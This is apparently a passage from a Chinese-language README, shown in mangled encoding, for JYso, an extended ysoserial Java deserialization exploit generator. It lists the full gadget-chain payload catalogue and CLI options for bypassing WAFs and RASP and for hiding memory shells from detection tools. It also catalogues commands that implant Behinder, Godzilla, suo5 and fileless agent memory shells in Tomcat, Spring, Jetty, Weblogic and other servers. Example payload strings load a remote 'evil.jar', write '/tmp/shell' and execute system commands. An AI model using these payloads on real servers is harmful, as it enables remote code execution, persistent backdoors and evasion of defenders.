| cc31or321<br />cc322                        | CommonsCollections13567 | org.apache.commons.collections.functors.ChainedTransformer<br />org.apache.commons.collections.ExtendedProperties$1 | CommonsCollections1/3/5/6/7<br />éœ€è¦<=3.2.1ç‰ˆæœ¬             |
| cc40<br />cc41                              | CommonsCollections24    | org.apache.commons.collections4.functors.ChainedTransformer<br />org.apache.commons.collections4.FluentIterable | CommonsCollections2/4é“¾<br />éœ€è¦4-4.0ç‰ˆæœ¬                   |
| cb17<br />cb18x<br />cb19x                  | CommonsBeanutils2       | org.apache.commons.beanutils.MappedPropertyDescriptor\$1<br />org.apache.commons.beanutils.DynaBeanMapDecorator\$MapEntry<br />org.apache.commons.beanutils.BeanIntrospectionData | 1.7x-1.8xä¸º-3490850999041592962<br />1.9xä¸º-2044202215314119608 |
| c3p092x<br />c3p095x                        | C3P0                    | com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase<br />com.mchange.v2.c3p0.test.AlwaysFailDataSource | 0.9.2pre2-0.9.5pre8ä¸º7387108436934414104<br />0.9.5pre9-0.9.5.5ä¸º7387108436934414104 |
| ajw                                         | AspectJWeaver           | org.aspectj.weaver.tools.cache.SimpleCache                   | AspectJWeaver,éœ€è¦cc31                                       |
| bsh20b4<br />bsh20b5<br />bsh20b6           | bsh                     | bsh.CollectionManager\$1<br />bsh.engine.BshScriptEngine<br />bsh.collection.CollectionIterator\$1 | 2.0b4ä¸º4949939576606791809<br />2.0b5ä¸º4041428789013517368<br />2.0.b6æ— æ³•ååºåˆ—åŒ– |
| groovy1702311<br />groovy24x<br />groovy244 | Groovy                  | org.codehaus.groovy.reflection.ClassInfo\$ClassInfoSet<br />groovy.lang.Tuple2<br />org.codehaus.groovy.runtime.dgm\$1170 | 2.4.xä¸º-8137949907733646644<br />2.3.xä¸º1228988487386910280  |
| becl                                        | Becl                    | com.sun.org.apache.bcel.internal.util.ClassLoader            | JDK<8u251                                                    |
| Jdk7u21                                     | Jdk7u21                 | com.sun.corba.se.impl.orbutil.ORBClassLoader                 | JDK<=7u21                                                    |
| JRE8u20                                     | JRE8u20                 | javax.swing.plaf.metal.MetalFileChooserUI\$DirectoryComboBoxModel\$1 | 7u25<=JDK<=8u20<br />è¿™ä¸ªæ£€æµ‹ä¸å®Œç¾,8u25ç‰ˆæœ¬ä»¥åŠJDK<=7u21ä¼šè¯¯æŠ¥<br />å¯ç»¼åˆJdk7u21æ¥çœ‹ |
| linux<br />windows                          | winlinux                | sun.awt.X11.AwtGraphicsConfigData<br />sun.awt.windows.WButtonPeer | windows/linuxç‰ˆæœ¬åˆ¤æ–­                                        |
| jackson2100                                 | jackson                 | com.fasterxml.jackson.databind.node.NodeSerialization        |                                                              |
| ROME                                        | ROME                    | com.sun.syndication.feed.impl.ToStringBean<br />com.rometools.rome.feed.impl.ObjectBean |                                                              |
| SpringAOP                                   | fastjon<br /> jackson   | org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource |                                                              |
| fastjson                                    | fastjon                 | com.alibaba.fastjson.JSONArray                               |                                                              |
|                                             | all                     | å…¨éƒ¨æ£€æµ‹                                                     | å…¨éƒ¨æ£€æµ‹                                                     |


* æ•ˆæœå›¾

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230821090740.png)

---

# 2 ysoserialç”¨æ³•

```payloadä¸åŒºåˆ†å¤§å°å†™```

é¡¹ç›®æ”¯æŒåˆ©ç”¨é“¾å±•ç¤ºï¼š

é“¾å­å‚è€ƒ1.5 Deserializationè·¯ç”±

```text7
[root]#~  Usage: java -jar JYso-[version].jar -yso -g [payload] -p [command] [options]
[root]#~  Available payload types:
     Payload                                     Authors                                Dependencies                                                                                                                                                                        
     -------                                     -------                                ------------                                                                                                                                                                        
     AspectJWeaver                               @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                
     AspectJWeaver2                                                                     aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                    
     BeanShell1                                  @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                         
     C3P0                                        @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                          
     C3P02                                                                              c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35                                                                                                           
     C3P03                                                                              c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, groovy:2.3.9                                                                                                              
     C3P04                                                                              c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, snakeyaml:1.30                                                                                                            
     C3P092                                      @mbechler                              c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11                                                                                                                   
     Click1                                      @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                         
     Clojure                                     @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                       
     CommonsBeanutils1                           @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                               
     CommonsBeanutils1183NOCC                                                           commons-beanutils:1.8.3                                                                                                                                                             
     CommonsBeanutils1Jdbc                       @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                               
     CommonsBeanutils2                                                                  commons-beanutils:1.9.2                                                                                                                                                             
     CommonsBeanutils2Jdbc                       @frohoff                               commons-beanutils:1.9.2                                                                                                                                                             
     CommonsBeanutils2NOCC                                                              commons-beanutils:1.8.3, commons-logging:1.2                                                                                                                                        
     CommonsBeanutilsAttrCompare                 @æ°´æ»´                                   commons-beanutils:1.9.2                                                                                                                                                           
     CommonsBeanutilsAttrCompare183              @SummerSec                             commons-beanutils:1.8.3                                                                                                                                                             
     CommonsBeanutilsObjectToStringComparator    @æ°´æ»´                                   commons-beanutils:1.9.2, commons-lang3:3.10                                                                                                                                       
     CommonsBeanutilsObjectToStringComparator183 @SummerSec                             commons-beanutils:1.8.3, commons-lang3:3.10                                                                                                                                         
     CommonsBeanutilsPropertySource              @SummerSec                             commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                          
     CommonsBeanutilsPropertySource183           @SummerSec                             commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                          
     CommonsCollections1                         @frohoff                               commons-collections:3.1                                                                                                                                                             
     CommonsCollections10                                                               commons-collections:3.2.1                                                                                                                                                           
     CommonsCollections11                                                                                                                                                                                                                                                   
     CommonsCollections12                                                               commons-collections:3.2.1                                                                                                                                                           
     CommonsCollections2                         @frohoff                               commons-collections4:4.0                                                                                                                                                            
     CommonsCollections3                         @frohoff                               commons-collections:3.1                                                                                                                                                             
     CommonsCollections4                         @frohoff                               commons-collections4:4.0                                                                                                                                                            
     CommonsCollections5                         @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                             
     CommonsCollections6                         @matthias_kaiser                       commons-collections:3.1                                                                                                                                                             
     CommonsCollections7                         @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                             
     CommonsCollections8                         @navalorenzo                           commons-collections4:4.0                                                                                                                                                            
     CommonsCollections9                         @æ¢…å­é…’                                 commons-collections:3.2.1                                                                                                                                                        
     CommonsCollectionsK1                                                               commons-collections:3.1                                                                                                                                                             
     CommonsCollectionsK1Jdbc                                                                                                                                                                                                                                               
     CommonsCollectionsK2                                                               commons-collections:4.0                                                                                                                                                             
     CommonsCollectionsK3                        @matthias_kaiser                       commons-collections:3.1                                                                                                                                                             
     CommonsCollectionsK4                        @matthias_kaiser                       commons-collections:4.0                                                                                                                                                             
     CommonsCollectionsK5                                                               commons-collections:4.0                                                                                                                                                             
     CommonsCollectionsK6                                                               commons-collections:4.0                                                                                                                                                             
     Fastjson1                                                                                                                                                                                                                                                              
     Fastjson2                                                                                                                                                                                                                                                              
     Groovy1                                     @frohoff                               groovy:2.3.9                                                                                                                                                                        
     Hibernate1                                  @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                     
     Hibernate2                                  @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                     
     JBossInterceptors1                          @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                            
     JRE8u20                                     @frohoff                                                                                                                                                                                                                   
     JRE8u20_2                                                                                                                                                                                                                                                              
     JRMPClient                                  @mbechler                                                                                                                                                                                                                  
     JRMPClient_Activator                        @mbechler                                                                                                                                                                                                                  
     JRMPClient_Obj                              @mbechler                                                                                                                                                                                                                  
     JRMPListener                                @mbechler                                                                                                                                                                                                                  
     JSON1                                       @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Jackson                                                                                                                                                                                                                                                                
     JacksonLdapAttr                                                                                                                                                                                                                                                        
     JavassistWeld1                              @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                        
     Jdk7u21                                     @frohoff                                                                                                                                                                                                                   
     Jdk7u21variant                              @potats0                                                                                                                                                                                                                   
     Jython1                                     @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                             
     MozillaRhino1                               @matthias_kaiser                       js:1.7R2                                                                                                                                                                            
     MozillaRhino2                               @_tint0                                js:1.7R2                                                                                                                                                                            
     Myfaces1                                    @mbechler                                                                                                                                                                                                                  
     Myfaces2                                                                                                                                                                                                                                                               
     ROME                                        @mbechler                              rome:1.0                                                                                                                                                                            
     ROME2                                                                              rome:1.0                                                                                                                                                                            
     RenderedImage                                                                      jai-codec-1.1.3                                                                                                                                                                     
     SignedObject                                                                                                                                                                                                                                                           
     Spring1                                     @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                               
     Spring2                                     @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                           
     Spring3                                                                            spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2                                                                                                    
     URLDNS                                      @gebl                                                                                                                                                                                                                      
     Vaadin1                                     @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                          
     Wicket1                                     @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                 



usage: JYso-[version].jar [-ch <arg>] [-dcfp <arg>] [-dl <arg>] [-dt <arg>] [-f <arg>] [-g <arg>] [-gen] [-gzk <arg>] [-h] [-hk <arg>] [-ht <arg>] [-hv <arg>] [-i] [-mcl] [-n <arg>] [-ncs] [-o] [-p
       <arg>] [-pw <arg>] [-rh] [-u <arg>] [-yso <arg>]
 -ch,--cmd-header <arg>                      è¯·æ±‚å¤´ï¼Œå°†å‘½ä»¤ä¼ é€’ç»™æ‰§è¡Œï¼Œé»˜è®¤[X-Token-Data]
 -dcfp,--define-class-from-parameter <arg>   ä½¿ç”¨ DefineClassFromParameter æ—¶è‡ªå®šä¹‰å‚æ•°åç§°
 -dl,--dirty-length <arg>                    ä½¿ç”¨ç±»å‹ 1 æˆ– 3 æ—¶çš„è„æ•°æ®é•¿åº¦/ä½¿ç”¨ç±»å‹ 2 æ—¶çš„åµŒå¥—å¾ªç¯è®¡æ•°
 -dt,--dirty-type <arg>                      åˆ©ç”¨è„æ•°æ®ç»•è¿‡WAFï¼Œç±»å‹ï¼š1:Random Hashable Collections/2:LinkedList Nesting/3:Serialized Dataä¸­çš„TC_RESET
 -f,--file <arg>                             å°†è¾“å‡ºå†™å…¥ FileOutputStreamï¼ˆæŒ‡å®šæ–‡ä»¶åï¼‰
 -g,--gadget <arg>                           Java deserialization gadget
 -gen,--gen-mem-shell                        å°†å†…å­˜ Shell ç±»å†™å…¥æ–‡ä»¶
 -gzk,--godzilla-key <arg>                   Godzilla key,default [key]
 -h,--hide-mem-shell                         å¯¹æ£€æµ‹å·¥å…·éšè—å†…å­˜å¤–å£³ï¼ˆç±»å‹2ä»…æ”¯æŒSpringControllerMSï¼‰
 -hk,--header-key <arg>                      MemoryShell æ ‡å¤´æ£€æŸ¥ï¼Œè¯·æ±‚æ ‡å¤´å¯†é’¥ï¼Œé»˜è®¤ [Referer]
 -ht,--hide-type <arg>                       éšè—å†…å­˜shellï¼Œè¾“å…¥1ï¼šwrite /jre/lib/charsets.jar 2ï¼šwrite /jre/classes/
 -hv,--header-value <arg>                    MemoryShell æ ‡å¤´æ£€æŸ¥,è¯·æ±‚æ ‡å¤´å€¼,é»˜è®¤ [https://www.baidu.com/]
 -i,--inherit                                æ˜¯å¦è®©payloadç»§æ‰¿AbstractTransletï¼ˆä½ç‰ˆæœ¬çš„JDKå¦‚1.6åº”è¯¥ç»§æ‰¿ï¼‰
 -mcl,--mozilla-class-loader                 åœ¨ TransformerUtil ä¸­ä½¿ç”¨ org.mozilla.javascript.DefiningClassLoader
 -n,--gen-mem-shell-name <arg>               å†…å­˜å¤–å£³ç±»æ–‡ä»¶å
 -ncs,--no-com-sun                           å¼ºåˆ¶ä½¿ç”¨ org.apache.XXX.TemplatesImpl è€Œä¸æ˜¯ com.sun.org.apache.XXX.TemplatesImpl
 -o,--obscure                                ä½¿ç”¨åå°„ç»•è¿‡RASP
 -p,--parameters <arg>                       Gadget parameters
 -pw,--password <arg>                        Behinder æˆ– Godzilla å¯†ç ï¼Œé»˜è®¤ [p@ssw0rd]
 -rh,--rhino                                 ä½¿ç”¨Rhino Engine æŠŠå†…å­˜é©¬ä»£ç è½¬æ¢ä¸ºJS
 -u,--url <arg>                              MemoryShellç»‘å®šurlæ¨¡å¼ï¼Œé»˜è®¤[/sysinfo]
 -utf,--utf8-Overlong-Encoding               UTF-8 Overlong Encoding Bypass waf
 -yso,--ysoserial <arg>                      Java deserialization


Recommended Usage: -yso -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser
If you want your payload being extremely shortï¼Œyou could just use:
java -jar JYso-[version].jar -yso 1 -g [payload] -p '[command]' -i -f evil.ser
```

## 2.1 åˆ©ç”¨æ–¹å¼

åœ¨åŸç‰ˆçš„åˆ©ç”¨æ–¹å¼ä¸­ï¼Œå¯¹äºä½¿ç”¨ TemplatesImpl çš„åˆ©ç”¨æ–¹å¼ï¼Œä»…ä½¿ç”¨äº†å•ä¸€çš„ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ï¼›å¯¹äºä½¿ç”¨ ChainedTransformer
çš„åˆ©ç”¨æ–¹å¼ï¼Œä¹Ÿæ˜¯ä»… chain äº†ä¸€ä¸ª Runtime execï¼Œå†æ¼æ´åˆ©ç”¨ä¸Šè¿‡äºå±€é™ä¸”å•ä¸€ï¼Œå› æ­¤æœ¬é¡¹ç›®åœ¨åŸç‰ˆé¡¹ç›®åŸºç¡€ä¸Šæ‰©å±•äº†ä¸åŒçš„åˆ©ç”¨æ–¹å¼ä»¥ä¾›åœ¨å®æˆ˜ç¯å¢ƒä¸­æ ¹æ®æƒ…å†µé€‰æ‹©ã€‚

## 2.2 é’ˆå¯¹ TemplatesImpl

åŸç‰ˆä»…ä½¿ç”¨äº† Runtime çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼Œè¿™é‡Œå¯¹å…¶è¿›è¡Œæ·±åº¦çš„æ‰©å±•ï¼Œå¹¶æ¤å…¥äº†å¤šç§å†…å­˜é©¬çš„åŠŸèƒ½ã€‚

## 2.3 æ‰©å±•æ”»å‡»-å†…å­˜é©¬åŠå›æ˜¾

å¦‚æœä½¿ç”¨è¿™äº›åˆ©ç”¨é“¾è¿›è¡Œæ”»å‡»ï¼Œæœ¬é¡¹ç›®å†…ç½®äº†ä¸€äº›é«˜çº§æ‰©å±•ç”¨æ³•ï¼Œå‘½ä»¤å‡ä½¿ç”¨ `EX-` å¼€å¤´ï¼ŒåŒ…æ‹¬å†…å­˜é©¬ã€å‘½ä»¤æ‰§è¡Œå›æ˜¾ç­‰ï¼Œå…·ä½“å¦‚ä¸‹ï¼š

å‘½ä»¤æ‰§è¡Œå›æ˜¾ï¼š

- å‘½ä»¤ `EX-AllEcho`ï¼šDFS æ‰¾ Request å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-TomcatEcho`ï¼šTomcat å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-SpringEcho`ï¼šSpring å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-JbossEcho`ï¼šJboss å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-jettyEcho`ï¼šJetty å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-LinuxEcho1`ï¼šLinux å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-LinuxEcho2`ï¼šLinux å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-resinEcho`ï¼šResin å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-weblogicEcho`ï¼šWeblogic å‘½ä»¤æ‰§è¡Œå›æ˜¾
- å‘½ä»¤ `EX-WindowsEcho`ï¼šWindows å‘½ä»¤æ‰§è¡Œå›æ˜¾

è§£å†³ Shiro Header å¤´éƒ¨è¿‡é•¿é—®é¢˜ï¼š

- å‘½ä»¤ `EX-DefineClassFromParameter`ï¼šä» request ä¸­è·å–æŒ‡å®šå‚æ•°çš„å€¼è¿›è¡Œç±»åŠ è½½

å†…å­˜é©¬ï¼š

- å‘½ä»¤ `EX-MS-SpringInterceptorMS-...`ï¼šå‘ç³»ç»Ÿå†…æ¤å…¥ Spring æ‹¦æˆªå™¨ç±»å‹çš„å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-SpringControllerMS-...`ï¼šå‘ç³»ç»Ÿå†…æ¤å…¥ Spring Controller ç±»å‹çš„å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-SpringWebfluxMS-...`ï¼šå‘ç³»ç»Ÿå†…æ¤å…¥ Spring WebFilter ç±»å‹çš„å†…å­˜é©¬ï¼ˆä»…æ”¯æŒ gz åŠ cmdï¼‰
- å‘½ä»¤ `EX-MS-TSMSFromJMXF`ï¼šåˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TSMSFromJMXS-...`ï¼šåˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Servlet å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TLMSFromJMXLi-...`ï¼šåˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Listener å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-JFMSFromJMXF-...`ï¼šåˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Jetty Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-JFMSFromJMXS-...`ï¼šåˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Jetty Servlet å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TFMSFromRequestF-...`ï¼šé€šè¿‡åœ¨çº¿ç¨‹ç»„ä¸­æ‰¾ Request å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TSMSFromRequestS-...`ï¼šé€šè¿‡åœ¨çº¿ç¨‹ç»„ä¸­æ‰¾ Request å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Servlet å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TFMSFromThreadF-...`ï¼šé€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TFMSFromThreadLi-...`ï¼šé€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Listener å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-TFMSFromThreadS-...`ï¼šé€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Servlet å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-JBFMSFromContextF-...`ï¼šé€šè¿‡å…¨å±€ä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ JBoss/Wildfly Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-JBFMSFromContextS-...`ï¼šé€šè¿‡å…¨å±€ä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ JBoss/Wildfly Servlet å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-RFMSFromThreadF-...`ï¼šé€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡ç³»ç»Ÿå†…æ¤å…¥ Resin Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-RFMSFromThreadS-...`ï¼šé€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡ç³»ç»Ÿå†…æ¤å…¥ Resin Servlet å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-WSFMSFromThread-...`ï¼šé€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡ç³»ç»Ÿå†…æ¤å…¥ Websphere Filter å‹å†…å­˜é©¬
- å‘½ä»¤ `EX-MS-RMIBindTemplate-...`ï¼šRMI å‹å†…å­˜é©¬

ç›®å‰æ”¯æŒçš„ç›´æ‰“å†…å­˜é©¬çš„ç±»å‹åŒ…æ‹¬ Tomcatã€Jettyã€JBoss/Wildflyã€Websphereã€Resinã€Springã€‚

å¹¶å¯ä»¥é€šè¿‡å…³é”®å­—æŒ‡å®šå†…å­˜é©¬çš„ç±»å‹ï¼Œå¦‚å†°èå†…å­˜é©¬ã€å“¥æ–¯æ‹‰ Base64 å†…å­˜é©¬ã€å“¥æ–¯æ‹‰ RAW å†…å­˜é©¬ã€CMD å‘½ä»¤å›æ˜¾é©¬ç­‰ï¼Œä½¿ç”¨æ–¹æ³•ä¾‹å­å¦‚ä¸‹ï¼š

- `EX-MS-TSMSFromThread-bx`ï¼š`å†°è` é€»è¾‘å†…å­˜é©¬
- `EX-MS-TSMSFromThread-gz`ï¼š`å“¥æ–¯æ‹‰` Base64 é€»è¾‘å†…å­˜é©¬
- `EX-MS-TSMSFromThread-gzraw`ï¼š`å“¥æ–¯æ‹‰` RAW é€»è¾‘å†…å­˜é©¬
- `EX-MS-TSMSFromThread-cmd`ï¼š`CMD` å‘½ä»¤å›æ˜¾å†…å­˜é©¬
- `EX-MS-TSMSFromThread-suo5`ï¼š`suo5` suo5 éš§é“é©¬

å¦å¤–è¿˜æœ¬é¡¹ç›®ç›®å‰æ”¯æŒäº† Tocmat WebSocketã€Upgrade ä»¥åŠ Executor å‘½ä»¤æ‰§è¡Œå†…å­˜é©¬ï¼Œæš‚æœªæ‰©å±•æˆå¤šç§ç±»å‹ï¼ˆå› ä¸ºç›¸å…³å·¥å…·ä¸æ”¯æŒï¼Œéœ€é­”æ”¹ï¼‰ï¼Œä½¿ç”¨æ–¹æ³•ä¾‹å­å¦‚ä¸‹ï¼š

- `EX-MS-TWSMSFromThread` : `CMD` å‘½ä»¤å›æ˜¾ WebSocket å†…å­˜é©¬
- `EX-MS-TEXMSFromThread` : `CMD` å‘½ä»¤å›æ˜¾ Executor å†…å­˜é©¬
- `EX-MS-TUGMSFromJMXuP` : `CMD` å‘½ä»¤å›æ˜¾ Upgrade å†…å­˜é©¬
- `EX-cmsMSBYNC`: ç»•è¿‡Nginxã€CDNä»£ç†é™åˆ¶çš„ WebSocket é©¬ï¼Œè·¯å¾„`/x`
- `EX-proxyMSBYNC`: ç»•è¿‡Nginxã€CDNä»£ç†é™åˆ¶çš„ WebSocket é©¬ï¼Œè·¯å¾„`/x`
- `EX-WsResin`: é€‚é… Resin çš„ WebSocket é©¬ï¼Œè¯·æ±‚å¤´ä¸­`Upgrade: websocket`
- `EX-MsTSJser`: é€‚é…Tomcatã€Springã€Jettyçš„ WebSocket é©¬ï¼Œè·¯å¾„`/cmd`
- `EX-MsTSJproxy`: é€‚é…Tomcatã€Springã€Jettyçš„ WebSocket é©¬ï¼Œè·¯å¾„`/proxy`
- `EX-WsWeblogic`: é€‚é… Weblogic çš„ WebSocket é©¬ï¼Œè·¯å¾„`/path`
- `EX-WSWebsphereProxy`: é€‚é… Websphere çš„ WebSocket é©¬ï¼Œè·¯å¾„`/path`

å¯¹äºä¸€äº›éå¸¸è§„çš„ç¯å¢ƒï¼Œæœ¬é¡¹ç›®è¿˜æä¾›äº†åŸºäº Java åŸç”Ÿçš„ RMI å†…å­˜é©¬åŠå‘½ä»¤å›æ˜¾æ–¹å¼ï¼Œé€šè¿‡å‘ RMI æ³¨å†Œä¸­å¿ƒç»‘å®šä¸€ä¸ªæ¶æ„ç±»ï¼Œå¯ä»¥éšæ—¶è°ƒç”¨æ‰§è¡Œå‘½ä»¤å¹¶å›æ˜¾ï¼Œä½¿ç”¨æ–¹æ³•ä¾‹å­å¦‚ä¸‹ï¼š

- `EX-MS-RMIBindTemplate-1100-qi4l`: `CMD` å‘½ä»¤å›æ˜¾ RMI å†…å­˜é©¬

æ— æ–‡ä»¶è½åœ°çš„ Agent å‹å†…å­˜é©¬ï¼Œé€šè¿‡ä¿®æ”¹ç³»ç»Ÿå…³é”®ç±»å­—èŠ‚ç ï¼Œæ¤å…¥å†…å­˜é©¬ï¼Œæ— ä»»ä½•æ–‡ä»¶è½åœ°ï¼Œå…¨ç¨‹åœ¨å†…å­˜æ“ä½œï¼Œèƒ½ç»•è¿‡å¤šç§é˜²æŠ¤å’Œæ£€æµ‹ï¼Œä½¿ç”¨æ–¹å¼ `EX-Agent-Lin/Win-Filter/Servlet-bx/gzraw/gz/cmd`ï¼Œç›®å‰åŒºåˆ† Win/Lin æ“ä½œç³»ç»Ÿï¼Œå¹¶æ”¯æŒäº† Servletã€Tomcat Filter å‹å†…å­˜é©¬ï¼Œå°†ä¼šæŒç»­æ›´æ–°ä¸€äº› Hook ç‚¹ï¼Œä½¿ç”¨æ–¹å¼ä¾‹å¦‚ï¼š

- `EX-Agent-Lin-Filter-bx`ï¼šåœ¨ Linux ç³»ç»Ÿä¸Šå¯¹ Tomcat Filter ä¿®æ”¹ç±»å­—èŠ‚ç çš„å†°è Agent å‹å†…å­˜é©¬

æœ¬å·¥å…·æ”¯æŒçš„å…¨éƒ¨å†…å­˜é©¬ç»è¿‡æµ‹è¯•å¯ç”¨ï¼Œä½†å®é™…å—åˆ°ä¸­é—´ä»¶ç‰ˆæœ¬çš„é™åˆ¶ï¼Œå¯¹äºå†…å­˜é©¬çš„ç›¸å…³æµ‹è¯•ï¼Œå¯ä»¥å‚è€ƒé¡¹ç›® [https://github.com/su18/MemoryShell](https://github.com/su18/MemoryShell)

## 2.4 é’ˆå¯¹ ChainedTransformer

- CommonsCollections1
- CommonsCollections5
- CommonsCollections6
- CommonsCollections7
- CommonsCollections9
- CommonsCollectionsK3
- CommonsCollectionsK4
- commonscollectionsK5

æœ¬é¡¹ç›®ä¸ºå…¶æ‹“å±•äº†é™¤äº† Runtime æ‰§è¡Œå‘½ä»¤æ„å¤–çš„å¤šç§åˆ©ç”¨æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š

- TS ï¼šThread Sleep - é€šè¿‡ `Thread.sleep()` çš„æ–¹å¼æ¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿ç”¨å‘½ä»¤ï¼š`TS-10`
- RC ï¼šRemote Call - é€šè¿‡ `URLClassLoader.loadClass()` æ¥è°ƒç”¨è¿œç¨‹æ¶æ„ç±»å¹¶åˆå§‹åŒ–ï¼Œä½¿ç”¨å‘½ä»¤ï¼š`RC-http://xxxx.com/evil.jar#EvilClass`
- WF ï¼šWrite File - é€šè¿‡ `FileOutputStream.write()` æ¥å†™å…¥æ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼š`WF-/tmp/shell#d2hvYW1p`
- PB ï¼šProcessBuilder é€šè¿‡ `ProcessBuilder.start()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ `PB-lin-d2hvYW1p` / `PB-win-d2hvYW1p`åˆ†åˆ«åœ¨ä¸åŒæ“ä½œç³»ç»Ÿæ‰§è¡Œå‘½ä»¤
